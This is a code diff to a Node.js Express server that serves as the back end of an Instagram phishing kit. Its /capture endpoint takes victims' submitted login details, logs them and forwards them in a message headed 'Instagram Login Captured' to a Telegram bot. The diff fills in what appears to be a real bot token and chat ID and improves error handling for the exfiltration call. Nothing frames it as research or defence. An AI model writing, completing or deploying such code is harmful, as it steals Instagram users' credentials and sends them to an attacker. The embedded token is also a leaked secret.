@@ -5,9 +5,9 @@ const fetch = require('node-fetch');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ←←← PUT YOUR DETAILS HERE
-const TELEGRAM_TOKEN = "7123456789:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxx";   // Your bot token
-const CHAT_ID = "123456789";                                           // Your chat ID
+// YOUR TELEGRAM DETAILS (already filled)
+const TELEGRAM_TOKEN = "8696476669:AAGMMBP7BKj3f_D4KwMU4xbVMEj4q_hZqr4";
+const CHAT_ID = "8725339154";
 
 app.use(cors());
 app.use(express.json());
@@ -22,7 +22,7 @@ app.post('/capture', async (req, res) => {
 
     console.log(`[CAPTURED] Username: ${username}`);
 
-    // Nice formatted message with spoiler for password
+    // Clean and nicely formatted message
     const message = `
 *Instagram Login Captured* 🔥
 
@@ -33,7 +33,7 @@ app.post('/capture', async (req, res) => {
     `.trim();
 
     try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
@@ -42,9 +42,14 @@ app.post('/capture', async (req, res) => {
                 parse_mode: "MarkdownV2"
             })
         });
-        console.log("✅ Sent to Telegram successfully");
+
+        if (response.ok) {
+            console.log("✅ Successfully sent to Telegram");
+        } else {
+            console.error(`❌ Telegram Error: ${response.status}`);
+        }
     } catch (err) {
-        console.error("❌ Telegram send failed:", err.message);
+        console.error("❌ Failed to send to Telegram:", err.message);
     }
 
     res.json({ success: true });
@@ -52,5 +57,5 @@ app.post('/capture', async (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`🚀 Server running on http://localhost:${PORT}`);
-    console.log("Test a login and check your Telegram!");
+    console.log("✅ Telegram bot is ready. Test a login now!");
 });
